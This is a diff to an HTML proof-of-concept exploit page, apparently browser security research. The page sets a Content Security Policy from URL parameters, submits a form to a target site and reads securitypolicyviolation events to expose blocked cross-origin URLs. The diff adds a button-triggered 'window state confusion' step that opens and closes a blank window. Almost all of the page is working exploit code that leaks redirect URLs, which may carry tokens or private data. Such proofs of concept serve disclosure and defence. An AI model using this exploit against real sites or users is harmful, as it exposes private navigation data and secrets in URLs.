@@ -3,11 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>POC - UTAA</title>
+    <title>POC - Putra Mahardika</title>
     <script>
-        
         const params = new URLSearchParams(window.location.search);
-
         const targetUrl = params.get('url');
         const allowedDomain = params.get('domain');
         const metaCSP = document.createElement('meta');
@@ -22,44 +20,41 @@
     <p>Targeting URL: <strong id="displayUrl"></strong></p>
     <p>Allowed Domain (CSP): <strong id="displayDomain"></strong></p>
     <hr>
-    <p>Status: <span id="status" style="font-weight: bold; color: blue;">Running exploit...</span></p>
-
+    <p>Status: <span id="status" style="font-weight: bold; color: blue;">Waiting for user action...</span></p>
     <form id="autoExploitForm" method="GET"></form>
-
+    <button id="exploitBtn"
+        style="padding: 10px 20px; font-size: 16px; font-weight: bold; cursor: pointer;">Exploit</button>
     <div id="log" style="margin-top: 20px; color: red; font-weight: bold;"></div>
-
     <script>
         document.getElementById('displayUrl').innerText = targetUrl;
         document.getElementById('displayDomain').innerText = allowedDomain;
+        const form = document.getElementById('autoExploitForm');
+        form.action = targetUrl;
         document.addEventListener('securitypolicyviolation', (e) => {
             document.getElementById('status').innerText = "VIOLATION DETECTED!";
             document.getElementById('status').style.color = "red";
-
-            const leakData = {
-                directive: e.violatedDirective,
-                leakedBlockedURI: e.blockedURI
-            };
-
+            const props = new Set('url,documentURL,blockedURL,documentURI,blockedURI,referrer,sample,sourceFile,script-sample,message,stack,reason,href,src,data,target'.split(','));
             const resultDiv = document.getElementById('log');
             resultDiv.innerHTML = `
-                <h3>LEAKED DATA:</h3>
-                <pre style="background: #eee; padding: 15px; border: 2px solid red; overflow-x: auto;">
-${JSON.stringify(leakData, null, 2)}
-                </pre>
+                <pre style="background: #eee; padding: 15px; border: 2px solid red; overflow-x: auto;">${JSON.stringify(e, [...props], 2)}</pre>
             `;
 
-            console.error("Leak detected!", leakData);
+            console.error("Leak detected!", e);
         });
-        window.onload = () => {
-            console.log(`Setting up form to target: ${targetUrl}`);
-            const form = document.getElementById('autoExploitForm');
-            form.action = targetUrl;
+        async function exploit() {
+            document.getElementById('status').innerText = "Running exploit...";
+            console.log("Triggering form submission with window state confusion...");
 
-            console.log("Triggering automated form submission...");
-            setTimeout(() => {
+            const win = window.open('about:blank');
+            try {
+                win.close();
+            } catch (err) {
+                console.log(err);
+            } finally {
                 form.submit();
-            }, 500);
-        };
+            }
+        }
+        document.getElementById('exploitBtn').addEventListener('click', exploit);
     </script>
 </body>
 
